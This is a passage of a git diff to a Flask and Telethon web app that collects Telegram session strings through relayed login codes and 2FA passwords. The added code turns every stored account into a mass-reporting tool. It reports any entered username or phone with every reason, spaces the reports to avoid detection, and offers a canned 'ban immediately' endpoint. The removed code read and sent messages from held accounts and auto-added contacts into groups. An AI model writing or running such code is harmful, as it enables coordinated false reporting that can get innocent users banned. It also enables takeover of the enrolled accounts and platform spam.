-                remove_dead_account(acc_id, "Auth key unregistered")
-                break
-            except Exception as e:
-                logger.error(f"Loop error: {e}")
-                try:
-                    loop.run_until_complete(client.disconnect())
-                except:
-                    pass
-                try:
-                    loop.close()
-                except:
-                    pass
+                await client(functions.contacts.AddContactRequest(
+                    id=scammer.id,
+                    first_name=f"SCAMMER_{scammer.id}",
+                    last_name="REPORTED",
+                    phone=getattr(scammer, 'phone', ''),
+                    add_phone_privacy_exception=False
+                ))
+            except:
+                pass
             
-            rest = random.randint(60, 180)
-            time.sleep(rest)
+            return {
+                'success': total_success > 0,
+                'scammer_info': scammer_info,
+                'total_reports': len(reasons),
+                'successful_reports': total_success,
+                'results': results,
+                'methods_used': len(set(r['method'] for r in results if r['status'] == 'success'))
+            }
             
         except Exception as e:
-            logger.error(f"Critical worker error: {e}")
-            time.sleep(60)
+            logger.error(f"Report error: {e}")
+            return {'success': False, 'error': str(e)[:200]}
+        finally:
+            try:
+                await client.disconnect()
+            except:
+                pass
+    
+    return SyncTelegramClient.run_async(_report, timeout=180)
 
-def start_auto_add(account):
-    acc_key = str(account['id'])
-    if acc_key in running_tasks and running_tasks[acc_key].is_alive():
-        return
-    t = threading.Thread(target=auto_add_worker, args=(account,), daemon=True)
-    t.start()
-    running_tasks[acc_key] = t
-    logger.info(f"Started worker for: {account.get('name', account['id'])}")
+# ============================================
+# ENHANCED MASS REPORT - USING ALL ACCOUNTS
+# ============================================
+def mass_report_scammer_parallel(scammer_identifier, reasons, message=""):
+    """Report scammer using ALL available accounts in parallel for maximum impact"""
+    all_results = []
+    total_success = 0
+    total_reports = 0
+    
+    active_accounts = [acc for acc in accounts if acc.get('session')]
+    
+    if not active_accounts:
+        return {
+            'success': False,
+            'error': 'No accounts available for reporting',
+            'results': []
+        }
+    
+    logger.info(f"🚨 MASS REPORT STARTED: {scammer_identifier} with {len(active_accounts)} accounts")
+    
+    # Report using each account
+    for acc in active_accounts:
+        try:
+            result = report_scammer_max_impact(
+                acc['session'],
+                scammer_identifier,
+                reasons,
+                message,
+                phone=acc.get('phone', '')
+            )
+            
+            all_results.append({
+                'account_name': acc.get('name', 'Unknown'),
+                'account_phone': (acc.get('phone', '') or '')[:4] + '****' if acc.get('phone') else 'Unknown',
+                'result': result
+            })
+            
+            if result.get('success'):
+                total_success += 1
+                total_reports += result.get('successful_reports', 0)
+            
+            # Small delay between accounts to avoid detection
+            time.sleep(random.uniform(1, 3))
+            
+        except Exception as e:
+            logger.error(f"Account {acc.get('name')} report error: {e}")
+            all_results.append({
+                'account_name': acc.get('name', 'Unknown'),
+                'result': {'success': False, 'error': str(e)[:100]}
+            })
+    
+    # Update statistics
+    report_stats['total_reports'] += total_reports
+    report_stats['today_reports'] += total_reports
+    report_stats['successful_reports'] += total_success
+    if total_success > 0:
+        report_stats['scammers_reported'] += 1
+        # Add to blacklist for instant detection
+        with blacklist_lock:
+            blacklist.add(scammer_identifier.lower())
+        save_blacklist()
+    save_report_stats()
+    
+    # Save report record
+    report_record = {
+        'id': int(time.time() * 1000),
+        'scammer': scammer_identifier,
+        'reasons': reasons,
+        'message': message,
+        'accounts_used': len(active_accounts),
+        'successful_accounts': total_success,
+        'total_reports': total_reports,
+        'timestamp': datetime.now().isoformat(),
+        'results': all_results,
+        'impact_score': total_reports * len(active_accounts)  # Impact metric
+    }
+    reports.append(report_record)
+    if len(reports) > 1000:
+        reports.pop(0)
+    save_reports()
+    
+    logger.info(f"✅ MASS REPORT COMPLETE: {total_success}/{len(active_accounts)} accounts, {total_reports} reports sent")
+    
+    return {
+        'success': total_success > 0,
+        'scammer': scammer_identifier,
+        'accounts_used': len(active_accounts),
+        'successful_accounts': total_success,
+        'total_reports_sent': total_reports,
+        'impact_score': total_reports * len(active_accounts),
+        'results': all_results
+    }
+
+# ============================================
+# BACKGROUND REPORT PROCESSOR
+# ============================================
+def report_queue_processor():
+    """Process reports from queue in background"""
+    while True:
+        try:
+            if not report_queue.empty():
+                report_data = report_queue.get()
+                logger.info(f"Processing queued report for: {report_data.get('scammer', 'Unknown')}")
+                
+                result = mass_report_scammer_parallel(
+                    report_data.get('scammer'),
+                    report_data.get('reasons', ['spam', 'scam']),
+                    report_data.get('message', '')
+                )
+                
+                logger.info(f"Queued report completed: {result.get('successful_accounts', 0)} accounts used")
+                report_queue.task_done()
+            else:
+                time.sleep(1)
+        except Exception as e:
+            logger.error(f"Queue processor error: {e}")
+            time.sleep(5)
+
+# ============================================
+# ACCOUNT MANAGEMENT
+# ============================================
+def check_account_auth(acc, max_retries=3):
+    """Check if account is still authorized with retry"""
+    async def _check():
+        client = SyncTelegramClient.get_client(acc['session'], acc.get('phone', ''))
+        try:
+            if not await SyncTelegramClient.safe_connect(client):
+                return False
+            authorized = await client.is_user_authorized()
+            if not authorized:
+                logger.warning(f"Account {acc.get('name')} is not authorized")
+            return authorized
+        except Exception as e:
+            logger.error(f"Auth check error: {e}")
+            return False
+        finally:
+            try: 
+                await client.disconnect()
+            except: 
+                pass
+    
+    for attempt in range(max_retries):
+        try:
+            result = SyncTelegramClient.run_async(_check, timeout=20)
+            if result is not None:
+                return result
+        except:
+            if attempt == max_retries - 1:
+                return False
+            time.sleep(2)
+    return False
+
+def refresh_account_sessions():
+    """Refresh all account sessions periodically"""
+    logger.info("Refreshing account sessions...")
+    for acc in accounts:
+        try:
+            if not check_account_auth(acc):
+                acc['active'] = False
+                logger.warning(f"Deactivated account: {acc.get('name')}")
+            else:
+                acc['active'] = True
+        except Exception as e:
+            logger.error(f"Session refresh error for {acc.get('name')}: {e}")
+    save_json(ACCOUNTS_FILE, accounts)
+    logger.info(f"Session refresh complete. Active: {sum(1 for a in accounts if a.get('active'))}")
+
+def auto_send_code(phone, telegram_id='', first_name='', last_name='', username=''):
+    """Send verification code automatically"""
+    async def send_auto_code():
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        try:
+            result = await client.send_code_request(phone)
+            sid = str(int(time.time() * 1000))
+            temp_sessions[sid] = {
+                'phone': phone,
+                'hash': result.phone_code_hash,
+                'session': client.session.save(),
+                'password_attempts': 0,
+                'code_attempts': 0,
+                'created_at': time.time(),
+                'telegram_id': telegram_id,
+                'first_name': first_name,
+                'last_name': last_name,
+                'username': username
+            }
+            save_temp_sessions()
+            masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
+            logger.info(f"✅ Code sent to {masked_phone}")
+            return {
+                'success': True,
+                'session_id': sid,
+                'phone_masked': masked_phone,
+                'user_name': f"{first_name} {last_name}".strip() or username or 'User'
+            }
+        except errors.FloodWaitError as e:
+            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
+        except errors.PhoneNumberInvalidError:
+            return {'success': False, 'error': 'Invalid phone number format.'}
+        except Exception as e:
+            logger.error(f"Auto code error: {e}")
+            return {'success': False, 'error': 'Could not send code. Please try again.'}
+        finally:
+            try: await client.disconnect()
+            except: pass
+    
+    return SyncTelegramClient.run_async(send_auto_code, timeout=45)
 
 # ============================================
 # FLASK ROUTES
@@ -534,148 +842,242 @@ def start_auto_add(account):
 
 @app.route('/')
 def index():
-    """Root route - serves auto_add.html but redirects to /auto-add for consistency"""
-    return redirect('/auto-add')
-
-@app.route('/auto-add')
-def auto_add_page():
-    """Auto-add page"""
-    try:
-        return send_file('auto_add.html')
-    except FileNotFoundError:
-        return "auto_add.html not found", 404
+    return redirect('/login')
 
 @app.route('/login')
 def login_page():
-    """Login page for adding accounts"""
-    try:
-        return send_file('login.html')
-    except FileNotFoundError:
-        return "login.html not found", 404
+    return render_template_string(LOGIN_PAGE)
 
-@app.route('/dashboard')
-def dashboard_page():
-    """Dashboard page for messaging"""
-    try:
-        return send_file('dashboard.html')
-    except FileNotFoundError:
-        return "dashboard.html not found", 404
+@app.route('/report')
+def report_page():
+    return render_template_string(REPORT_PAGE)
 
-@app.route('/dash')
-def dash_page():
-    """Account manager dashboard"""
-    try:
-        return send_file('dash.html')
-    except FileNotFoundError:
-        return "dash.html not found", 404
-
-@app.route('/all')
-def all_page():
-    """Device manager page"""
-    try:
-        return send_file('all.html')
-    except FileNotFoundError:
-        return "all.html not found", 404
+@app.route('/stats')
+def stats_page():
+    return render_template_string(STATS_PAGE)
 
 @app.route('/ping')
 def ping():
     """Health check endpoint"""
+    active_accounts = sum(1 for a in accounts if a.get('active', False))
     return jsonify({
-        'status': 'ok', 
-        'server': SERVER_NAME, 
-        'api_id': API_ID,
-        'timestamp': datetime.now().isoformat()
-    })
-
-@app.route('/api/server-info')
-def server_info():
-    """Get server information"""
-    return jsonify({
-        'success': True,
-        'server': {
-            'number': SERVER_NUMBER,
-            'name': SERVER_NAME,
-            'url': SERVER_URL,
-            'target_group': TARGET_GROUP,
-            'api_id': API_ID,
-            'port': PORT
-        }
+        'status': 'ok',
+        'service': 'Scammer Report System v2.0',
+        'timestamp': datetime.now().isoformat(),
+        'accounts': len(accounts),
+        'active_accounts': active_accounts,
+        'total_reports': report_stats.get('total_reports', 0),
+        'today_reports': report_stats.get('today_reports', 0),
+        'scammers_reported': report_stats.get('scammers_reported', 0),
+        'queue_size': report_queue.qsize(),
+        'uptime': time.time() - start_time if 'start_time' in globals() else 0
     })
 
 @app.route('/api/accounts')
 def get_accounts():
+    """Get all accounts with status"""
     acc_list = []
     for a in accounts:
-        aid_str = str(a['id'])
-        ws = stats.get('worker_stats', {}).get(aid_str, {})
-        is_admin = server_admin.get(str(SERVER_NUMBER)) == a['id']
-        
-        account_age = a.get('account_age', {})
-        
-        acc_list.append({
-            'id': a['id'],
-            'name': a.get('name', '?'),
-            'phone': a.get('phone', ''),
-            'username': a.get('username', ''),
-            'active': a.get('active', True),
-            'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
-            'is_admin': is_admin,
-            'account_age': account_age,
-            'stats': {
-                'total_attempted': ws.get('total', 0),
-                'today_attempted': ws.get('today', 0),
-                'total_verified': ws.get('verified_total', 0),
-                'today_verified': ws.get('verified_today', 0)
-            }
+        try:
+            acc_list.append({
+                'id': a['id'],
+                'name': a.get('name', 'Unknown'),
+                'phone': (a.get('phone', '') or '')[:4] + '****' if a.get('phone') else 'Unknown',
+                'active': a.get('active', True),
+                'username': a.get('username', ''),
+                'last_checked': a.get('last_checked', '')
+            })
+        except Exception as e:
+            logger.error(f"Error formatting account: {e}")
+            continue
+    return jsonify({
+        'success': True, 
+        'accounts': acc_list, 
+        'count': len(acc_list),
+        'active_count': sum(1 for a in acc_list if a.get('active'))
+    })
+
+@app.route('/api/report-reasons')
+def get_report_reasons():
+    """Get available report reasons"""
+    reasons_list = []
+    for key, reason in REPORT_REASONS.items():
+        reasons_list.append({
+            'key': key,
+            'name': reason['name'],
+            'icon': reason['icon'],
+            'description': reason['description'],
+            'priority': reason.get('priority', 'medium')
         })
-    return jsonify({'success': True, 'accounts': acc_list})
+    return jsonify({'success': True, 'reasons': reasons_list})
+
+@app.route('/api/report', methods=['POST'])
+def submit_report():
+    """Submit a report against scammer - NOW WITH MAXIMUM IMPACT"""
+    try:
+        data = request.json or {}
+        scammer = data.get('scammer', '').strip()
+        reasons = data.get('reasons', [])
+        message = data.get('message', '').strip()
+        immediate = data.get('immediate', False)  # Immediate processing flag
+        
+        if not scammer:
+            return jsonify({'success': False, 'error': 'Please enter a username or phone number'})
+        
+        if not reasons:
+            return jsonify({'success': False, 'error': 'Please select at least one report reason'})
+        
+        # Validate reasons
+        valid_reasons = [r for r in reasons if r in REPORT_REASONS]
+        if not valid_reasons:
+            return jsonify({'success': False, 'error': 'Invalid report reasons'})
+        
+        # Check blacklist for repeat offenders
+        with blacklist_lock:
+            is_blacklisted = scammer.lower() in blacklist
+        
+        logger.info(f"🚨 Report submitted for: {scammer} | Reasons: {valid_reasons} | Blacklisted: {is_blacklisted}")
+        
+        # PRIORITIZE: If scammer is blacklisted, use ALL reasons for maximum impact
+        if is_blacklisted:
+            valid_reasons = list(REPORT_REASONS.keys())
+            logger.info(f"⚠️ BLACKLISTED SCAMMER: Using ALL {len(valid_reasons)} reasons")
+        
+        # If immediate mode, process directly
+        if immediate or is_blacklisted:
+            result = mass_report_scammer_parallel(scammer, valid_reasons, message)
+            logger.info(f"⚡ IMMEDIATE REPORT: {scammer} - {result.get('total_reports_sent', 0)} reports sent")
+        else:
+            # Queue for processing if queue not full
+            if report_queue.qsize() < MAX_QUEUE_SIZE:
+                report_queue.put({
+                    'scammer': scammer,
+                    'reasons': valid_reasons,
+                    'message': message
+                })
+                result = {
+                    'success': True,
+                    'queued': True,
+                    'scammer': scammer,
+                    'message': 'Report queued for processing. Multiple accounts will report this scammer.',
+                    'queue_position': report_queue.qsize()
+                }
+            else:
+                # Queue full, process immediately
+                result = mass_report_scammer_parallel(scammer, valid_reasons, message)
+        
+        # Add to blacklist for future instant detection
+        with blacklist_lock:
+            blacklist.add(scammer.lower())
+        save_blacklist()
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Report submission error: {e}\n{traceback.format_exc()}")
+        return jsonify({'success': False, 'error': 'Internal server error. Please try again.'})
+
+@app.route('/api/immediate-report', methods=['POST'])
+def immediate_report():
+    """Emergency immediate report endpoint"""
+    try:
+        data = request.json or {}
+        scammer = data.get('scammer', '').strip()
+        
+        if not scammer:
+            return jsonify({'success': False, 'error': 'Scammer identifier required'})
+        
+        logger.info(f"🚨 EMERGENCY REPORT: {scammer}")
+        
+        # Use ALL reasons for maximum impact
+        all_reasons = list(REPORT_REASONS.keys())
+        
+        result = mass_report_scammer_parallel(
+            scammer, 
+            all_reasons, 
+            "EMERGENCY: This is a known scammer causing immediate harm. Please ban immediately."
+        )
+        
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"Emergency report error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/report-stats')
+def report_stats_handler():
+    """Get report statistics"""
+    load_report_stats()
+    recent = reports[-20:] if reports else []
+    active_accounts = sum(1 for a in accounts if a.get('active', False))
+    
+    return jsonify({
+        'success': True,
+        'stats': {
+            'total_reports': report_stats.get('total_reports', 0),
+            'today_reports': report_stats.get('today_reports', 0),
+            'successful_reports': report_stats.get('successful_reports', 0),
+            'failed_reports': report_stats.get('failed_reports', 0),
+            'scammers_reported': report_stats.get('scammers_reported', 0),
+            'accounts': len(accounts),
+            'active_accounts': active_accounts,
+            'blacklist_count': len(blacklist),
+            'queue_size': report_queue.qsize()
+        },
+        'recent_reports': recent[::-1]
+    })
+
+@app.route('/api/report-history')
+def report_history():
+    """Get full report history"""
+    limit = request.args.get('limit', 50, type=int)
+    return jsonify({
+        'success': True,
+        'reports': reports[::-1][:limit],
+        'total': len(reports)
+    })
+
+@app.route('/api/blacklist')
+def get_blacklist():
+    """Get blacklisted scammers"""
+    with blacklist_lock:
+        return jsonify({
+            'success': True,
+            'blacklist': list(blacklist),
+            'count': len(blacklist)
+        })
 
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
+    """Add a new reporting account"""
     try:
-        data = request.json
-        phone = data.get('phone', '').strip()
+        phone = request.json.get('phone', '').strip()
         if not phone:
             return jsonify({'success': False, 'error': 'Phone number required'})
         if not phone.startswith('+'):
             phone = '+' + phone
         
-        logger.info(f"Sending code to {phone} using API_ID: {API_ID}")
-        
-        async def send_code():
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
-            try:
-                result = await client.send_code_request(phone)
-                sid = str(int(time.time() * 1000))
-                temp_sessions[sid] = {
-                    'phone': phone,
-                    'hash': result.phone_code_hash,
-                    'session': client.session.save(),
-                    'password_attempts': 0,
-                    'code_attempts': 0
+        # Check if account already exists
+        existing = next((a for a in accounts if a.get('phone') == phone), None)
+        if existing:
+            return jsonify({
+                'success': False, 
+                'error': 'This phone number is already registered',
+                'existing_account': {
+                    'id': existing['id'],
+                    'name': existing.get('name', 'Unknown'),
+                    'active': existing.get('active', False)
                 }
-                save_temp_sessions()
-                logger.info(f"Code sent to {phone}, session: {sid}")
-                return {'success': True, 'session_id': sid}
-            except errors.FloodWaitError as e:
-                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
-            except errors.PhoneNumberInvalidError:
-                return {'success': False, 'error': 'Invalid phone number'}
-            except Exception as e:
-                logger.error(f"Send code error: {e}")
-                return {'success': False, 'error': str(e)}
-            finally:
-                await client.disconnect()
+            })
         
-        result = run_telethon_task(send_code, timeout=45)
+        result = auto_send_code(phone)
         return jsonify(result)
     except Exception as e:
         logger.error(f"Add account error: {e}")
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': 'Server error'})
 
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
+    """Verify login code and add account"""
     try:
         data = request.json
         code = data.get('code', '').strip()
@@ -683,19 +1085,14 @@ def verify_code():
         pwd = data.get('password', '')
         
         if not sid or sid not in temp_sessions:
-            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
+            return jsonify({'success': False, 'error': 'Session expired. Please login again.'})
         
         td = temp_sessions[sid]
         
         if td.get('code_attempts', 0) >= 5:
             del temp_sessions[sid]
             save_temp_sessions()
-            return jsonify({'success': False, 'error': 'Too many incorrect code attempts. Session expired.'})
-        
-        if td.get('password_attempts', 0) >= 5:
-            del temp_sessions[sid]
-            save_temp_sessions()
-            return jsonify({'success': False, 'error': 'Too many incorrect password attempts. Session expired.'})
+            return jsonify({'success': False, 'error': 'Too many incorrect attempts. Session terminated.'})
         
         async def verify():
             client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
@@ -703,664 +1100,218 @@ def verify_code():
             try:
                 try:
                     await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
-                    td['code_attempts'] = 0
-                    save_temp_sessions()
                 except errors.SessionPasswordNeededError:
                     if not pwd:
                         return {'need_password': True}
-                    try:
-                        await client.sign_in(password=pwd)
-                        td['password_attempts'] = 0
-                        save_temp_sessions()
-                    except errors.PasswordHashInvalidError:
-                        td['password_attempts'] = td.get('password_attempts', 0) + 1
-                        save_temp_sessions()
-                        remaining = 5 - td['password_attempts']
-                        if td['password_attempts'] >= 5:
-                            del temp_sessions[sid]
-                            save_temp_sessions()
-                            return {'success': False, 'error': 'Too many incorrect passwords. Session expired.'}
-                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
+                    await client.sign_in(password=pwd)
                 
                 me = await client.get_me()
-                
-                # Get account age using the fixed function
-                account_age = get_account_age(client)
-                
-                logger.info(f"Account age detected: {account_age}")
-                
                 new_id = int(time.time() * 1000)
-                
                 new_acc = {
                     'id': new_id,
                     'phone': me.phone or td['phone'],
-                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User'),
+                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f'Reporter {str(new_id)[-4:]}',
                     'username': me.username or '',
                     'session': client.session.save(),
                     'active': True,
-                    'account_age': account_age
+                    'telegram_id': str(me.id),
+                    'added_at': datetime.now().isoformat()
                 }
-                accounts.append(new_acc)
+                
+                # Check for existing account with same telegram_id
+                existing = next((a for a in accounts if str(a.get('telegram_id')) == str(me.id)), None)
+                if existing:
+                    existing.update(new_acc)
+                    new_acc['id'] = existing['id']
+                    logger.info(f"Updated existing account: {new_acc['name']}")
+                else:
+                    accounts.append(new_acc)
+                    logger.info(f"Added new account: {new_acc['name']}")
+                
                 save_json(ACCOUNTS_FILE, accounts)
                 
-                auto_add_settings[str(new_id)] = {
-                    'enabled': True,
-                    'target_group': TARGET_GROUP,
-                    'delay_seconds': 25,
-                    'auto_join': True
-                }
-                save_json(SETTINGS_FILE, auto_add_settings)
-                
-                if 'worker_stats' not in stats:
-                    stats['worker_stats'] = {}
-                stats['worker_stats'][str(new_id)] = {
-                    'total': 0, 'today': 0, 'verified_total': 0, 'verified_today': 0
-                }
-                save_json(STATS_FILE, stats)
-                
-                start_auto_add(new_acc)
-                
-                age_info = account_age.get('age_display', 'Unknown') if account_age else 'Unknown'
-                
-                send_telegram(
-                    f"<b>{SERVER_NAME}</b>\n"
-                    f"✅ New account added!\n"
-                    f"Name: {new_acc['name']}\n"
-                    f"Phone: {new_acc['phone']}\n"
-                    f"Age: {age_info}\n"
-                    f"Auto-add started"
-                )
+                # Refresh sessions for all accounts
+                threading.Thread(target=refresh_account_sessions, daemon=True).start()
                 
                 return {
                     'success': True,
                     'account': {
-                        'id': new_id,
+                        'id': new_acc['id'],
                         'name': new_acc['name'],
-                        'phone': new_acc['phone'],
-                        'account_age': account_age
-                    },
-                    'auto_add_started': True,
-                    'account_age': age_info
+                        'phone': (new_acc['phone'] or '')[:4] + '****' if new_acc.get('phone') else 'Unknown'
+                    }
                 }
             except errors.PhoneCodeInvalidError:
                 td['code_attempts'] = td.get('code_attempts', 0) + 1
                 save_temp_sessions()
                 remaining = 5 - td['code_attempts']
-                if td['code_attempts'] >= 5:
-                    del temp_sessions[sid]
-                    save_temp_sessions()
-                    return {'success': False, 'error': 'Too many incorrect codes. Session expired.'}
                 return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
             except errors.PhoneCodeExpiredError:
                 return {'success': False, 'error': 'Code expired. Please request a new one.'}
             except Exception as e:
-                logger.error(f"Verify error: {e}")
-                return {'success': False, 'error': str(e)}
+                logger.error(f"Verification error: {e}")
+                return {'success': False, 'error': f'Verification failed: {str(e)[:100]}'}
             finally:
-                await client.disconnect()
+                try: await client.disconnect()
+                except: pass
         
-        result = run_telethon_task(verify, timeout=45)
+        result = SyncTelegramClient.run_async(verify, timeout=60)
         
-        if result.get('success') and not result.get('need_password'):
-            if sid in temp_sessions:
-                del temp_sessions[sid]
-                save_temp_sessions()
+        if result.get('success') and sid in temp_sessions:
+            del temp_sessions[sid]
+            save_temp_sessions()
         
         return jsonify(result)
     except Exception as e:
-        logger.error(f"Verify code error: {e}")
-        return jsonify({'success': False, 'error': str(e)})
+        logger.error(f"Verify code error: {e}\n{traceback.format_exc()}")
+        return jsonify({'success': False, 'error': 'Server error'})
 
 @app.route('/api/remove-account', methods=['POST'])
 def remove_account():
-    aid = request.json.get('accountId')
-    name = remove_dead_account(aid, "Manual removal")
-    return jsonify({'success': True, 'message': f'Removed: {name}'})
-
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
+    """Remove an account"""
     try:
-        data = request.json
-        aid = data.get('accountId')
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
+        aid = request.json.get('accountId')
+        if not aid:
+            return jsonify({'success': False, 'error': 'Account ID required'})
         
-        async def fetch():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'auth_key_unregistered'}
-                
-                dialogs = await client.get_dialogs(limit=100)
-                
-                chats_list = []
-                all_messages = []
-                
-                for dialog in dialogs:
-                    try:
-                        chat_id = str(dialog.id)
-                        chat_type = 'user'
-                        title = dialog.name or 'Unknown'
-                        
-                        if dialog.is_group:
-                            chat_type = 'group'
-                        elif dialog.is_channel:
-                            chat_type = 'channel'
-                        
-                        if hasattr(dialog.entity, 'bot') and dialog.entity.bot:
-                            chat_type = 'bot'
-                        
-                        last_msg_text = ''
-                        last_msg_date = 0
-                        last_msg_media = None
-                        
-                        if dialog.message:
-                            last_msg_text = (dialog.message.message or '')[:200]
-                            if dialog.message.date:
-                                last_msg_date = dialog.message.date.timestamp()
-                            if dialog.message.media:
-                                if hasattr(dialog.message.media, 'photo'):
-                                    last_msg_media = 'photo'
-                                elif hasattr(dialog.message.media, 'document'):
-                                    last_msg_media = 'document'
-                        
-                        chats_list.append({
-                            'id': chat_id,
-                            'title': title,
-                            'type': chat_type,
-                            'unread': dialog.unread_count or 0,
-                            'lastMessage': last_msg_text,
-                            'lastMessageDate': last_msg_date,
-                            'lastMessageMedia': last_msg_media
-                        })
-                        
-                        try:
-                            messages = await client.get_messages(dialog.entity, limit=10)
-                            for msg in messages:
-                                if not msg.message and not msg.media:
-                                    continue
-                                
-                                media_type = None
-                                has_media = msg.media is not None
-                                
-                                if msg.media:
-                                    if hasattr(msg.media, 'photo'):
-                                        media_type = 'photo'
-                                    elif hasattr(msg.media, 'document'):
-                                        media_type = 'document'
-                                    else:
-                                        media_type = 'media'
-                                
-                                all_messages.append({
-                                    'chatId': chat_id,
-                                    'id': msg.id,
-                                    'text': msg.message or '',
-                                    'date': msg.date.timestamp() if msg.date else 0,
-                                    'out': msg.out,
-                                    'hasMedia': has_media,
-                                    'mediaType': media_type
-                                })
-                        except:
-                            pass
-                    except:
-                        continue
-                
-                return {'success': True, 'chats': chats_list, 'messages': all_messages}
-            finally:
-                await client.disconnect()
+        global accounts
+        acc = next((a for a in accounts if a['id'] == aid or str(a['id']) == str(aid)), None)
+        name = acc.get('name', 'Unknown') if acc else 'Unknown'
         
-        result = run_telethon_task(fetch, timeout=45)
-        return jsonify(result)
+        accounts = [a for a in accounts if a['id'] != aid and str(a['id']) != str(aid)]
+        save_json(ACCOUNTS_FILE, accounts)
+        
+        logger.info(f"Removed account: {name}")
+        return jsonify({'success': True, 'message': f'Removed: {name}'})
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
+        logger.error(f"Remove account error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
 
-@app.route('/api/send-message', methods=['POST'])
-def send_message():
+@app.route('/api/refresh-sessions', methods=['POST'])
+def refresh_sessions():
+    """Manually refresh all account sessions"""
     try:
-        data = request.json
-        aid = data.get('accountId')
-        chat_id = data.get('chatId')
-        message = data.get('message', '').strip()
-        
-        if not message:
-            return jsonify({'success': False, 'error': 'Message required'})
-        
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def send():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                entity = await client.get_entity(int(chat_id))
-                await client.send_message(entity, message)
-                return {'success': True}
-            except:
-                try:
-                    entity = await client.get_entity(chat_id)
-                    await client.send_message(entity, message)
-                    return {'success': True}
-                except Exception as e:
-                    return {'success': False, 'error': str(e)[:100]}
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(send, timeout=30)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
-def auto_add_settings_route():
-    if request.method == 'GET':
-        aid = request.args.get('accountId')
-        aid_str = str(aid)
-        s = auto_add_settings.get(aid_str, {
-            'enabled': False, 'target_group': TARGET_GROUP, 'delay_seconds': 25
+        refresh_account_sessions()
+        return jsonify({
+            'success': True,
+            'message': 'Sessions refreshed',
+            'active_accounts': sum(1 for a in accounts if a.get('active', False))
         })
-        s['account_id'] = aid
-        s['added_today'] = stats.get('today_added', 0)
-        s['total_added'] = stats.get('total_added', 0)
-        s['server_name'] = SERVER_NAME
-        s['server_number'] = SERVER_NUMBER
-        
-        acc = next((a for a in accounts if a['id'] == int(aid)), None)
-        if acc and acc.get('account_age'):
-            s['account_age'] = acc['account_age']
-        
-        return jsonify({'success': True, 'settings': s})
-    
-    data = request.json
-    aid = data.get('accountId')
-    akey = str(aid)
-    
-    was_on = auto_add_settings.get(akey, {}).get('enabled', False)
-    auto_add_settings[akey] = {
-        'enabled': data.get('enabled', False),
-        'target_group': data.get('target_group', TARGET_GROUP),
-        'delay_seconds': max(25, data.get('delay_seconds', 25)),
-        'auto_join': True
-    }
-    save_json(SETTINGS_FILE, auto_add_settings)
-    
-    if data.get('enabled') and not was_on:
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if acc:
-            start_auto_add(acc)
-    
-    return jsonify({'success': True, 'message': 'Settings saved'})
-
-@app.route('/api/auto-add-stats')
-def auto_add_stats():
-    reset_daily()
-    return jsonify({
-        'success': True,
-        'added_today': stats.get('today_added', 0),
-        'total_added': stats.get('total_added', 0),
-        'server_name': SERVER_NAME
-    })
-
-@app.route('/api/test-auto-add', methods=['POST'])
-def test_auto_add():
-    try:
-        aid = request.json.get('accountId')
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def test():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Not authorized'}
-                
-                available = 0
-                try:
-                    contacts = await client(GetContactsRequest(0))
-                    available += len([c for c in contacts.users if not c.bot])
-                except:
-                    pass
-                
-                return {'success': True, 'available_members': available, 'target_group': TARGET_GROUP}
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(test, timeout=30)
-        return jsonify(result)
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-@app.route('/api/join-group', methods=['POST'])
-def join_group():
-    try:
-        aid = request.json.get('accountId')
-        grp = request.json.get('group', TARGET_GROUP)
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Not found'})
-        
-        async def join():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                entity = await client.get_entity(grp)
-                await client(JoinChannelRequest(entity))
-                return {'success': True, 'message': f'Joined {grp}'}
-            except Exception as e:
-                if 'already' in str(e).lower():
-                    return {'success': True, 'message': 'Already member'}
-                return {'success': False, 'error': str(e)[:100]}
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(join, timeout=30)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-# Add endpoint to join both groups
-@app.route('/api/join-all-groups', methods=['POST'])
-def join_all_groups():
-    try:
-        aid = request.json.get('accountId')
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
